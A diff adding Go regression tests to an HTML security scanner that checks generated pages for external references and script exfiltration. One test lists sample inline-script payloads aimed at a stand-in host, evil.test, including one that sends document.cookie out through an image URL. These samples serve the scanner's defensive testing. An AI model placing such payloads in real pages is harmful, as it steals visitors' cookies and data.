@@ -55,6 +55,54 @@ func TestCleanPagePasses(t *testing.T) {
 	}
 }
 
+// REGRESSION (Finding A — too broad): authored prose that documents the gate's
+// own url()/href patterns must NOT be flagged. The url() branch now requires the
+// scheme's `//`, so `url(https:)` (no host) in prose stays clean. Guards against
+// re-broadening that re-refused self-doc's security-gate page.
+func TestProseUrlNotFlagged(t *testing.T) {
+	clean := []string{
+		`<div>the gate forbids url(https:) and src=// CDN-ish refs.</div>`,
+		`<p>…CDN-ish src=// / href=// / url(https:).</p>`,
+		`<code>url(https:)</code> is documented, not fetched`,
+	}
+	for _, c := range clean {
+		if leaks := Scan(c); len(leaks) != 0 {
+			t.Errorf("prose documenting the pattern should be clean: %q -> %v", c, leaks)
+		}
+	}
+}
+
+// REGRESSION (Finding B — too narrow): an inline <script> that exfils via a
+// real http(s) URL must be caught even though it is not a src=/href= attribute.
+func TestInlineScriptExfilCaught(t *testing.T) {
+	cases := []string{
+		`<script>fetch('https://evil.test/x')</script>`,
+		`<script>new Image().src="https://evil.test/p.gif?"+document.cookie</script>`,
+		`<script>location='https://evil.test/'</script>`,
+		"<script>import(`https://evil.test/m.js`)</script>",
+	}
+	for _, c := range cases {
+		if leaks := Scan(c); len(leaks) == 0 {
+			t.Errorf("inline-script exfil must be caught: %q", c)
+		}
+	}
+}
+
+// The W3C SVG namespace used from JS (createElementNS) and a license-banner URL
+// surrounded by whitespace (the inlined svg-pan-zoom kit carries one) must stay
+// CLEAN — the exfil pass only flags value-shaped URLs, and w3.org is whitelisted.
+func TestInlineScriptBenignNotFlagged(t *testing.T) {
+	clean := []string{
+		`<script>document.createElementNS('http://www.w3.org/2000/svg','svg')</script>`,
+		`<script>/*! svg-pan-zoom plugin https://github.com/foo/bar v1 */ var x=1;</script>`,
+	}
+	for _, c := range clean {
+		if leaks := Scan(c); len(leaks) != 0 {
+			t.Errorf("benign in-script content should be clean: %q -> %v", c, leaks)
+		}
+	}
+}
+
 func TestMermaidRefused(t *testing.T) {
 	page := `<body><div class="mermaid">graph TD; A-->B</div></body>`
 	if !HasMermaid(page) {
